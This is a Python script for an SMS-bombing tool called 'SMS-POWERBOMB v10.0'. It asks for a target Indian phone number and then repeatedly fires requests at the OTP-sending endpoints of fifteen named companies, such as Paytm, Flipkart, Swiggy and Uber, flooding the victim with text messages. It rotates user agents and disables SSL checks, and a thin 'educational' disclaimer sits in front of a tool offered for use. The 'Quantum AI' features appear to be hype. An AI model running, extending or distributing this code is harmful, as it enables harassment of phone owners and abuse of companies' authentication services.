#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════
# ☠️ SMS-POWERBOMB v10.0 - ULTIMATE FINAL EDITION ☠️
# ═══════════════════════════════════════════════════════════════════
# Creator: RAJSARASWATI JATAV
# Team: RAJSARASWATI JATAV CYBER CREW
# ═══════════════════════════════════════════════════════════════════

import os
import sys
import time
import asyncio
import aiohttp
from typing import List, Dict, Tuple
import random
from datetime import datetime

# Try to import Rich UI
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, Confirm
    from rich import box
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    console = Console()
    RICH_ENABLED = True
except ImportError:
    RICH_ENABLED = False
    print("⚠️ Rich UI not available. Install: pip install rich")
    print("Running in basic mode...")
    time.sleep(2)

# Import other modules
try:
    from quantum_ai import QuantumAIEngine
    from ai_engine import AIEngine
    QUANTUM_AI = True
except ImportError:
    QUANTUM_AI = False

try:
    from analytics import AnalyticsEngine
    ANALYTICS = True
except ImportError:
    ANALYTICS = False

try:
    from enhanced_features import FavoritesManager, NetworkChecker
    ENHANCED = True
except ImportError:
    ENHANCED = False

# ═══════════════════════════════════════════════════════════════════
# BOMBER ENGINE
# ═══════════════════════════════════════════════════════════════════

class BomberEngine:
    def __init__(self, apis: List[Dict]):
        self.apis = apis
        self.api_health = {api['name']: {'success': 0, 'fail': 0, 'active': True} for api in apis}
        self.success_count = 0
        self.fail_count = 0
        self.total_attempts = 0
        self.start_time = None
        self.quantum_ai = QuantumAIEngine() if QUANTUM_AI else None
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        ]
    
    def get_random_user_agent(self) -> str:
        return random.choice(self.user_agents)
    
    def get_active_apis(self) -> List[Dict]:
        return [api for api in self.apis if self.api_health[api['name']]['active']]
    
    def update_api_health(self, api_name: str, success: bool):
        if success:
            self.api_health[api_name]['success'] += 1
        else:
            self.api_health[api_name]['fail'] += 1
        
        total = self.api_health[api_name]['success'] + self.api_health[api_name]['fail']
        if total >= 5:
            fail_rate = self.api_health[api_name]['fail'] / total
            if fail_rate > 0.9:
                self.api_health[api_name]['active'] = False
    
    async def send_sms(self, session: aiohttp.ClientSession, api: Dict, phone: str) -> Tuple[str, bool, str]:
        try:
            headers = api["headers"].copy()
            headers["User-Agent"] = self.get_random_user_agent()
            
            await asyncio.sleep(random.uniform(0.1, 0.5))
            
            start_time = time.time()
            
            async with session.post(
                api["url"],
                json=api["data"](phone),
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=15),
                ssl=False
            ) as response:
                response_time = time.time() - start_time
                
                if response.status in [200, 201, 202]:
                    self.update_api_health(api['name'], True)
                    if self.quantum_ai:
                        self.quantum_ai.record_quantum_result(api['name'], True, response_time)
                    return (api["name"], True, "Success")
                else:
                    self.update_api_health(api['name'], False)
                    if self.quantum_ai:
                        self.quantum_ai.record_quantum_result(api['name'], False, response_time)
                    return (api["name"], False, f"Status: {response.status}")
        
        except Exception as e:
            self.update_api_health(api['name'], False)
            return (api["name"], False, "Failed")
    
    def get_stats(self) -> Dict:
        success_rate = (self.success_count / self.total_attempts * 100) if self.total_attempts > 0 else 0
        elapsed_time = time.time() - self.start_time if self.start_time else 0
        
        return {
            "total_attempts": self.total_attempts,
            "success": self.success_count,
            "failed": self.fail_count,
            "success_rate": success_rate,
            "elapsed_time": elapsed_time,
            "active_apis": sum(1 for h in self.api_health.values() if h['active'])
        }

# ═══════════════════════════════════════════════════════════════════
# SMS APIS
# ═══════════════════════════════════════════════════════════════════

SMS_APIS = [
    {"name": "OLA", "url": "https://api.olacabs.com/v1/auth/otp", "method": "POST",
     "data": lambda phone: {"phone": phone, "country_code": "+91"},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Snapdeal", "url": "https://www.snapdeal.com/sendOTP", "method": "POST",
     "data": lambda phone: {"mobileNumber": phone, "purpose": "REGISTRATION"},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Paytm", "url": "https://accounts.paytm.com/v2/login/generateOtp", "method": "POST",
     "data": lambda phone: {"phone": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Flipkart", "url": "https://www.flipkart.com/api/5/user/otp/generate", "method": "POST",
     "data": lambda phone: {"loginId": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Zomato", "url": "https://accounts.zomato.com/login/phone", "method": "POST",
     "data": lambda phone: {"phone": phone, "country_id": "1"},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Swiggy", "url": "https://www.swiggy.com/dapi/auth/sms-otp", "method": "POST",
     "data": lambda phone: {"mobile": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "PhonePe", "url": "https://api.phonepe.com/apis/hermes/login", "method": "POST",
     "data": lambda phone: {"phoneNumber": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/v1/otp/generate", "method": "POST",
     "data": lambda phone: {"mobile": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Myntra", "url": "https://www.myntra.com/checkout/api/otp/generate", "method": "POST",
     "data": lambda phone: {"mobileNumber": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "BigBasket", "url": "https://www.bigbasket.com/auth/api/v1/otp/generate", "method": "POST",
     "data": lambda phone: {"mobile": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Uber", "url": "https://auth.uber.com/v2/otp/send", "method": "POST",
     "data": lambda phone: {"phoneNumber": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Rapido", "url": "https://api.rapido.bike/api/otp/generate", "method": "POST",
     "data": lambda phone: {"mobile": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Meesho", "url": "https://www.meesho.com/api/v1/otp/send", "method": "POST",
     "data": lambda phone: {"phone": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Ajio", "url": "https://www.ajio.com/api/auth/otp", "method": "POST",
     "data": lambda phone: {"mobileNumber": phone},
     "headers": {"Content-Type": "application/json"}},
    {"name": "Nykaa", "url": "https://www.nykaa.com/api/v1/otp/generate", "method": "POST",
     "data": lambda phone: {"mobile": phone},
     "headers": {"Content-Type": "application/json"}},
]

# ═══════════════════════════════════════════════════════════════════
# BOMBING FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

async def quantum_smart_bombing(engine: BomberEngine, phone: str, count: int):
    """Quantum AI smart bombing"""
    if RICH_ENABLED:
        console.print("\n[bold cyan]🧠 Quantum AI Smart Mode Activated[/bold cyan]")
        console.print("[dim]AI is analyzing patterns and selecting optimal APIs...[/dim]\n")
    else:
        print("\n🧠 Quantum AI Smart Mode Activated")
        print("AI is analyzing patterns...\n")
    
    time.sleep(1)
    engine.start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        for wave in range(count):
            if RICH_ENABLED:
                console.print(f"\n[bold magenta]{'═' * 60}[/bold magenta]")
                console.print(f"[bold cyan]Wave {wave + 1}/{count}[/bold cyan] - {datetime.now().strftime('%H:%M:%S')}")
                console.print(f"[bold magenta]{'═' * 60}[/bold magenta]\n")
            else:
                print(f"\n{'=' * 60}")
                print(f"Wave {wave + 1}/{count} - {datetime.now().strftime('%H:%M:%S')}")
                print(f"{'=' * 60}\n")
            
            # Get optimal APIs
            if engine.quantum_ai:
                optimal_apis = engine.quantum_ai.get_quantum_apis(engine.get_active_apis())
            else:
                optimal_apis = engine.get_active_apis()
            
            # Send SMS
            tasks = [engine.send_sms(session, api, phone) for api in optimal_apis]
            results = await asyncio.gather(*tasks)
            
            wave_success = 0
            wave_fail = 0
            
            for name, success, message in results:
                engine.total_attempts += 1
                if success:
                    engine.success_count += 1
                    wave_success += 1
                    if RICH_ENABLED:
                        console.print(f"  [green]✓[/green] {name:<15} [green][SENT][/green]")
                    else:
                        print(f"  ✓ {name:<15} [SENT]")
                else:
                    engine.fail_count += 1
                    wave_fail += 1
                    if RICH_ENABLED:
                        console.print(f"  [red]✗[/red] {name:<15} [red][FAILED][/red]")
                    else:
                        print(f"  ✗ {name:<15} [FAILED]")
            
            stats = engine.get_stats()
            if RICH_ENABLED:
                console.print(f"\n[cyan]Wave Stats:[/cyan] [green]{wave_success} Success[/green] | [red]{wave_fail} Failed[/red]\n")
            else:
                print(f"\nWave Stats: {wave_success} Success | {wave_fail} Failed\n")
            
            if wave < count - 1:
                delay = 2.0
                if engine.quantum_ai:
                    delay = engine.quantum_ai.calculate_quantum_delay(stats['success_rate'], 'smart')
                await asyncio.sleep(delay)
    
    # Save quantum memory
    if engine.quantum_ai:
        engine.quantum_ai.save_quantum_memory()
    
    print_summary(phone, engine.get_stats())

def print_summary(phone: str, stats: Dict):
    """Print final summary"""
    if RICH_ENABLED:
        table = Table(show_header=False, box=box.ROUNDED)
        table.add_column("Key", style="bold white")
        table.add_column("Value", style="cyan")
        
        table.add_row("📱 Target", phone)
        table.add_row("📊 Total Attempts", str(stats['total_attempts']))
        table.add_row("✅ Successful", f"[green]{stats['success']}[/green]")
        table.add_row("❌ Failed", f"[red]{stats['failed']}[/red]")
        table.add_row("📈 Success Rate", f"{stats['success_rate']:.1f}%")
        
        panel = Panel(table, title="[bold magenta]🎯 BOMBING COMPLETE[/bold magenta]", border_style="magenta")
        console.print("\n")
        console.print(panel)
    else:
        print("\n" + "=" * 60)
        print("BOMBING COMPLETE")
        print("=" * 60)
        print(f"Target: {phone}")
        print(f"Total Attempts: {stats['total_attempts']}")
        print(f"Successful: {stats['success']}")
        print(f"Failed: {stats['failed']}")
        print(f"Success Rate: {stats['success_rate']:.1f}%")
        print("=" * 60)

# ═══════════════════════════════════════════════════════════════════
# INPUT VALIDATION
# ═══════════════════════════════════════════════════════════════════

def validate_phone(phone: str) -> bool:
    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
    if len(phone) == 10 and phone.isdigit() and phone[0] in ['6', '7', '8', '9']:
        return True
    if len(phone) == 12 and phone.startswith("91") and phone[2] in ['6', '7', '8', '9']:
        return True
    return False

def normalize_phone(phone: str) -> str:
    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
    if len(phone) == 12 and phone.startswith("91"):
        return phone[2:]
    return phone

# ═══════════════════════════════════════════════════════════════════
# MAIN MENU
# ═══════════════════════════════════════════════════════════════════

def print_banner():
    """Print banner"""
    if RICH_ENABLED:
        banner = """
╔═══════════════════════════════════════════════════════════════╗
║         SMS-POWERBOMB v10.0 - ULTIMATE FINAL EDITION          ║
║              Created by RAJSARASWATI JATAV                    ║
╚═══════════════════════════════════════════════════════════════╝
        """
        console.print(banner, style="bold green")
    else:
        print("""
╔═══════════════════════════════════════════════════════════════╗
║         SMS-POWERBOMB v10.0 - ULTIMATE FINAL EDITION          ║
║              Created by RAJSARASWATI JATAV                    ║
╚═══════════════════════════════════════════════════════════════╝
        """)

def print_menu():
    """Print main menu"""
    if RICH_ENABLED:
        table = Table(show_header=False, box=box.ROUNDED, border_style="cyan")
        table.add_column("Option", style="yellow", width=8)
        table.add_column("Description", style="white")
        
        table.add_row("[1]", "🚀 Start SMS Bombing")
        table.add_row("[2]", "📊 View Analytics")
        table.add_row("[3]", "🔍 Check API Status")
        table.add_row("[4]", "🧠 Quantum AI Dashboard")
        table.add_row("[5]", "ℹ️  About")
        table.add_row("[0]", "🚪 Exit")
        
        panel = Panel(table, title="[bold cyan]MAIN MENU[/bold cyan]", border_style="cyan")
        console.print(panel)
    else:
        print("\n" + "=" * 60)
        print("MAIN MENU")
        print("=" * 60)
        print("[1] 🚀 Start SMS Bombing")
        print("[2] 📊 View Analytics")
        print("[3] 🔍 Check API Status")
        print("[4] 🧠 Quantum AI Dashboard")
        print("[5] ℹ️  About")
        print("[0] 🚪 Exit")
        print("=" * 60)

def start_bombing(engine: BomberEngine):
    """Start bombing"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    
    print("\n⚠️  DISCLAIMER: This tool is for EDUCATIONAL purposes ONLY!")
    print("Use responsibly and ethically. Get consent before use.\n")
    
    if RICH_ENABLED:
        accept = Confirm.ask("Do you accept the terms?", default=False)
    else:
        accept = input("Do you accept the terms? (yes/no): ").lower() in ['yes', 'y']
    
    if not accept:
        print("You must accept the terms to continue.")
        time.sleep(2)
        return
    
    # Get phone number
    while True:
        if RICH_ENABLED:
            phone = Prompt.ask("\n[cyan]Enter target phone number (10 digits)[/cyan]")
        else:
            phone = input("\nEnter target phone number (10 digits): ")
        
        if validate_phone(phone):
            phone = normalize_phone(phone)
            print(f"✓ Valid phone number: {phone}")
            break
        else:
            print("✗ Invalid phone number!")
    
    # Get wave count
    while True:
        try:
            if RICH_ENABLED:
                count = int(Prompt.ask("[cyan]Enter number of waves (1-100)[/cyan]", default="10"))
            else:
                count = int(input("Enter number of waves (1-100) [10]: ") or "10")
            
            if 1 <= count <= 100:
                print(f"✓ Wave count: {count}")
                break
            else:
                print("✗ Please enter 1-100")
        except ValueError:
            print("✗ Invalid input!")
    
    # Confirm
    if RICH_ENABLED:
        confirm = Confirm.ask(f"\n[yellow]Bomb {phone} with {count} waves?[/yellow]", default=False)
    else:
        confirm = input(f"\nBomb {phone} with {count} waves? (yes/no): ").lower() in ['yes', 'y']
    
    if not confirm:
        print("Operation cancelled.")
        time.sleep(2)
        return
    
    print("\n✓ Starting bombing sequence...\n")
    time.sleep(1)
    
    try:
        asyncio.run(quantum_smart_bombing(engine, phone, count))
    except KeyboardInterrupt:
        print("\n\n✗ Bombing interrupted by user.")
    
    input("\nPress Enter to continue...")

def show_api_status(engine: BomberEngine):
    """Show API status"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    
    print("\n🔍 API STATUS & HEALTH CHECK\n")
    
    active_count = sum(1 for h in engine.api_health.values() if h['active'])
    print(f"Total APIs: {len(SMS_APIS)}")
    print(f"Active APIs: {active_count}")
    print(f"Inactive APIs: {len(SMS_APIS) - active_count}\n")
    
    if RICH_ENABLED:
        table = Table(show_header=True, box=box.ROUNDED)
        table.add_column("#", style="dim", width=4)
        table.add_column("API Name", style="white", width=15)
        table.add_column("Status", width=10)
        table.add_column("Success", style="green", width=8)
        table.add_column("Failed", style="red", width=8)
        
        for idx, (api_name, health) in enumerate(engine.api_health.items(), 1):
            status = "[green]ACTIVE[/green]" if health['active'] else "[red]INACTIVE[/red]"
            table.add_row(str(idx), api_name, status, str(health['success']), str(health['fail']))
        
        console.print(table)
    else:
        print(f"{'#':<4} {'API Name':<15} {'Status':<10} {'Success':<8} {'Failed':<8}")
        print("-" * 60)
        for idx, (api_name, health) in enumerate(engine.api_health.items(), 1):
            status = "ACTIVE" if health['active'] else "INACTIVE"
            print(f"{idx:<4} {api_name:<15} {status:<10} {health['success']:<8} {health['fail']:<8}")
    
    input("\nPress Enter to continue...")

def main_menu():
    """Main menu loop"""
    engine = BomberEngine(SMS_APIS)
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_banner()
        print_menu()
        
        if RICH_ENABLED:
            choice = Prompt.ask("\n[cyan]Select an option[/cyan]")
        else:
            choice = input("\nSelect an option: ")
        
        if choice == "1":
            start_bombing(engine)
        elif choice == "2":
            print("\n📊 Analytics feature coming soon!")
            time.sleep(2)
        elif choice == "3":
            show_api_status(engine)
        elif choice == "4":
            print("\n🧠 Quantum AI Dashboard coming soon!")
            time.sleep(2)
        elif choice == "5":
            os.system('cls' if os.name == 'nt' else 'clear')
            print_banner()
            print("\nCreator: RAJSARASWATI JATAV")
            print("Team: RAJSARASWATI JATAV CYBER CREW")
            print("GitHub: github.com/RAJSARASWATI-JATAV")
            print("Telegram: t.me/rajsaraswatijatav")
            input("\nPress Enter to continue...")
        elif choice == "0":
            print("\n✓ Thank you for using SMS-POWERBOMB v10.0")
            print("Stay dark, stay ethical. Upgrade yourself!\n")
            time.sleep(2)
            sys.exit(0)
        else:
            print("\n✗ Invalid option!")
            time.sleep(2)

# ═══════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n\n✗ Interrupted by user (Ctrl+C).")
        print("Stay dark, stay ethical. Upgrade yourself!\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n✗ ERROR: {str(e)}\n")
        sys.exit(1)